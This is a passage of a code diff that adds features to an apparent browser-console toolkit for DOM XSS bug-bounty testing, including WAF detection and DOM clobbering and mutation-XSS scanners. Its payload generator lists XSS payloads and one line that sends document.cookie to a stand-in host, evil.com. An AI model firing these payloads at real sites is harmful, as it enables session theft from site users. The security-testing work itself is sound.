+      payloads.push({ payload: "javascript:alert(1)", description: "javascript: protocol" });
+      payloads.push({ payload: "data:text/html,<script>alert(1)</script>", description: "data: URI" });
+      payloads.push({ payload: "//evil.com/steal?c=" + document.cookie, description: "Open redirect to exfiltrate cookies" });
+    }
+    if (sinkType.includes("settimeout") || sinkType.includes("setinterval")) {
+      payloads.push({ payload: "alert(1)", description: "String argument to timer function" });
+      payloads.push({ payload: "1;alert(1)", description: "Semicolon injection" });
+    }
+    if (sinkType.includes("style") || sinkType.includes("css")) {
+      payloads.push({ payload: "background:url(javascript:alert(1))", description: "CSS javascript: URL" });
+      payloads.push({ payload: "expression(alert(1))", description: "IE CSS expression (legacy)" });
+    }
+
+    if (payloads.length === 0) {
+      payloads.push({ payload: "No auto-generated payloads for this sink type", description: "Manual testing required" });
+    }
+
+    console.log("%c💉 PoC Payload Generator:", "color: #e74c3c; font-weight: bold;");
+    console.log(`Source: ${sourceType || "any"}, Sink: ${sinkType}, Context: ${context || "default"}`);
+    console.table(payloads);
+    console.log("%c⚠️ Use these payloads responsibly and only on authorized targets.", "color: #f39c12;");
+    return payloads;
+  }
+  window.generatePoC = generatePoC;
+
+  // New Feature 7: WAF/Security Product Detection
+  function detectWAF() {
+    const signals = [];
+    // Check common WAF headers (via performance entries)
+    const entries = performance.getEntriesByType("resource");
+    const knownWAFs = [
+      { name: "Cloudflare", patterns: ["cloudflare", "cf-ray", "cf-cache-status"], header: "cf-ray" },
+      { name: "Akamai", patterns: ["akamai", "akamaihd", "x-akamai"], header: "x-akamai" },
+      { name: "AWS WAF", patterns: ["awswaf", "x-amzn-waf"], header: "x-amzn-waf" },
+      { name: "Imperva/Incapsula", patterns: ["incapsula", "imperva", "x-cdn"], header: "x-cdn" },
+      { name: "Sucuri", patterns: ["sucuri", "sucuridns"], header: "x-sucuri-id" },
+      { name: "ModSecurity", patterns: ["mod_security", "modsecurity"], header: "server" },
+      { name: "F5 BIG-IP ASM", patterns: ["bigip", "bigipdetect"], header: "server" },
+      { name: "Barracuda", patterns: ["barracuda"], header: "server" },
+      { name: "Fortinet", patterns: ["fortinet", "fortiweb"], header: "server" },
+      { name: "Microsoft Defender", patterns: ["defender", "x-msedge"], header: "x-powered-by" },
+    ];
+
+    // Check page content for WAF signatures
+    const bodyHTML = document.body.innerHTML || "";
+    const scripts = document.querySelectorAll("script[src]");
+    const scriptSrcs = Array.from(scripts).map((s) => s.src).join(" ");
+
+    knownWAFs.forEach(({ name, patterns }) => {
+      const found = patterns.some((p) => bodyHTML.toLowerCase().includes(p) || scriptSrcs.toLowerCase().includes(p));
+      if (found) signals.push({ waf: name, confidence: "HIGH", source: "page content" });
+    });
+
+    // Check for common WAF JavaScript signatures
+    const wafScripts = [
+      { name: "Cloudflare", test: () => !!window._cf_chl_opt || !!document.querySelector("#challenge-form") },
+      { name: "Imperva", test: () => !!window._imp_apid || !!document.querySelector("[data-sitekey]") },
+      { name: "reCAPTCHA", test: () => !!window.grecaptcha },
+      { name: "hCaptcha", test: () => !!window.hcaptcha },
+    ];
+
+    wafScripts.forEach(({ name, test }) => {
+      try {
+        if (test()) signals.push({ waf: name, confidence: "HIGH", source: "javascript detection" });
+      } catch (e) {}
+    });
+
+    console.log("%c🛡️ WAF/Security Product Detection:", "color: #3498db; font-weight: bold;");
+    if (signals.length > 0) {
+      console.log("%c⚠️ WAF/Security products detected:", "color: #f39c12;");
+      console.table(signals);
+      console.log("Note: WAF may block certain payloads. Use bypass techniques as needed.");
+    } else {
+      console.log("%cNo obvious WAF detected via client-side analysis.", "color: #7f8c8d;");
+      console.log("Note: Some WAFs are not detectable from the client side. Check response headers via DevTools.");
+    }
+    return signals;
+  }
+  window.detectWAF = detectWAF;
+
+  // New Feature 8: JavaScript Source Code Extraction
+  function extractJSSources() {
+    const sources = [];
+    // Inline scripts
+    document.querySelectorAll("script:not([src])").forEach((script, i) => {
+      sources.push({
+        type: "inline",
+        index: i,
+        length: script.textContent.length,
+        preview: script.textContent.substring(0, 200),
+        hasSinkPatterns: /eval\(|innerHTML|document\.write|setTimeout\(["']|setInterval\(["']/.test(script.textContent),
+      });
+    });
+    // External scripts
+    document.querySelectorAll("script[src]").forEach((script) => {
+      sources.push({
+        type: "external",
+        src: script.src,
+        async: script.async,
+        defer: script.defer,
+        integrity: script.integrity || "none",
+        crossOrigin: script.crossOrigin || "none",
+      });
+    });
+
+    console.log("%c📜 JavaScript Source Code Inventory:", "color: #3498db; font-weight: bold;");
+    console.log(`Inline scripts: ${sources.filter((s) => s.type === "inline").length}`);
+    console.log(`External scripts: ${sources.filter((s) => s.type === "external").length}`);
+    const withSinks = sources.filter((s) => s.hasSinkPatterns);
+    if (withSinks.length > 0) {
+      console.log("%c⚠️ Inline scripts with sink patterns:", "color: #e74c3c;");
+      console.table(withSinks.map((s) => ({ index: s.index, length: s.length, preview: s.preview.substring(0, 80) })));
+    }
+    console.log("%cTip: Use 'extractJSSources().forEach(s => { if(s.type === \"external\") fetch(s.src).then(r => r.text()).then(console.log) })' to fetch external script contents.", "color: #7f8c8d;");
+    return sources;
+  }
+  window.extractJSSources = extractJSSources;
+
+  // New Feature 9: DOM Clobbering Deep Scanner
+  function scanDOMClobbering() {
+    const findings = [];
+    const globalVars = new Set();
+
+    // Find all elements with id/name that could shadow globals
+    document.querySelectorAll("[id], [name]").forEach((el) => {
+      const id = el.id;
+      const name = el.getAttribute("name");
+      const identifiers = [id, name].filter(Boolean);
+
+      identifiers.forEach((ident) => {
+        // Check if this identifier is accessed as a global in inline scripts
+        let accessedGlobally = false;
+        document.querySelectorAll("script:not([src])").forEach((script) => {
+          const code = script.textContent;
+          // Look for bare identifier access (not preceded by . or [)
+          const regex = new RegExp(`(?<![.["'\\w])\\b${ident}\\b(?![\\w"'])`);
+          if (regex.test(code)) accessedGlobally = true;
+        });
+
+        if (accessedGlobally) {
+          findings.push({
+            identifier: ident,
+            tag: el.tagName,
+            type: id ? "id" : "name",
+            risk: "CRITICAL",
+            description: `Element ${el.tagName}#${ident} shadows a variable accessed in inline JavaScript`,
+          });
+        }
+      });
+    });
+
+    // Check for nested id/name patterns (classic clobbering: <a id="x"><div id="x">)
+    const idMap = {};
+    document.querySelectorAll("[id]").forEach((el) => {
+      const id = el.id;
+      if (idMap[id]) {
+        findings.push({
+          identifier: id,
+          tag: `${idMap[id].tagName} > ${el.tagName}`,
+          type: "nested-ids",
+          risk: "CRITICAL",
+          description: `Duplicate id="${id}" on ${idMap[id].tagName} and ${el.tagName} - DOM clobbering chain`,
+        });
+      }
+      idMap[id] = el;
+    });
+
+    console.log("%c🔍 DOM Clobbering Deep Scan:", "color: #e74c3c; font-weight: bold;");
+    if (findings.length > 0) {
+      console.table(findings);
+    } else {
+      console.log("%c✅ No DOM clobbering vectors with global access detected.", "color: #27ae60;");
+    }
+    return findings;
+  }
+  window.scanDOMClobbering = scanDOMClobbering;
+
+  // New Feature 10: Mutation-Based XSS (mXSS) Detector
+  function detectMutationXSS() {
+    const vectors = [];
+    // Check for elements that get re-parsed by the browser
+    const mXSSPatterns = [
+      { selector: "noscript", description: "noscript content is re-parsed when scripting is disabled/enabled" },
+      { selector: "math", description: "MathML namespace can cause re-parsing in some browsers" },
+      { selector: "svg", description: "SVG namespace can trigger different parsing modes" },
+      { selector: "template", description: "Template content is inert but can be activated" },
+      { selector: "foreignObject", description: "foreignObject inside SVG allows HTML re-parsing" },
+      { selector: "[data-*]", description: "Data attributes may be used by JS for innerHTML" },
+    ];
+
+    mXSSPatterns.forEach(({ selector, description }) => {
+      try {
+        document.querySelectorAll(selector).forEach((el) => {
+          const hasHTML = el.innerHTML && el.innerHTML.includes("<");
+          vectors.push({
+            element: el.tagName + "#" + (el.id || ""),
+            pattern: selector,
+            hasHTML,
+            risk: hasHTML ? "HIGH" : "MEDIUM",
+            description,
+          });
+        });
+      } catch (e) {}
+    });
+
+    console.log("%c🔬 Mutation XSS (mXSS) Vectors:", "color: #9b59b6; font-weight: bold;");
+    if (vectors.length > 0) {
+      console.table(vectors);
+      console.log("Tip: mXSS occurs when seemingly safe HTML is re-parsed by the browser in a different context.");
+      console.log("Test by injecting payloads into these elements and observing DOM changes.");
+    } else {
+      console.log("%cNo common mXSS vectors found.", "color: #27ae60;");
+    }
+    return vectors;
+  }
+  window.detectMutationXSS = detectMutationXSS;
+
+  console.log("\n%c🚀 ENHANCEMENTS & NEW FEATURES LOADED:", "color: #e74c3c; font-weight: bold;");
+  console.log("%c  Enhancements:", "color: #f39c12; font-weight: bold;");
+  console.log("%c    enumerateURLParams()             %c- List all URL parameters", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectDOMClobbering()            %c- Find DOM clobbering vectors", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    auditCookies()                   %c- Audit cookie security", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    checkSRI()                       %c- Check Subresource Integrity", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectOpenRedirectSinks()        %c- Find open redirect sinks", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectCSSExfiltration()          %c- Detect CSS exfiltration vectors", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectFrameworks()               %c- Detect JS frameworks/libraries", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectContentEditable()          %c- Find contenteditable/editors", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    recommendSecurityHeaders()       %c- HTTP security header advice", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    analyzeCSPDetailed()             %c- Deep CSP analysis", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c  New Features:", "color: #3498db; font-weight: bold;");
+  console.log("%c    startSinkInterception()          %c- Monkey-patch sinks for real-time monitoring", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    trackURLParameterTaint()         %c- Track URL params through DOM", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    testHashFragmentXSS()            %c- Test hash-based XSS", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    auditPostMessageHandlers()       %c- Audit postMessage origin checks", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectStorageToSinkChains()      %c- Find storage-to-sink chains", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    generatePoC(source, sink)        %c- Generate PoC payloads", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectWAF()                      %c- Detect WAF/security products", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    extractJSSources()               %c- Inventory all JavaScript sources", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    scanDOMClobbering()              %c- Deep DOM clobbering scanner", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+  console.log("%c    detectMutationXSS()              %c- Find mXSS vectors", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
+
   console.log("\n%c📚 METHODOLOGY & REFERENCE COMMANDS:", "color: #f39c12; font-weight: bold;");
   console.log("%c  displayMethodology()                 %c- Show bug bounty methodology", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
   console.log("%c  displaySafePayloads()                %c- Show safe test payloads", "font-weight: bold; color: #e74c3c;", "color: #7f8c8d;");
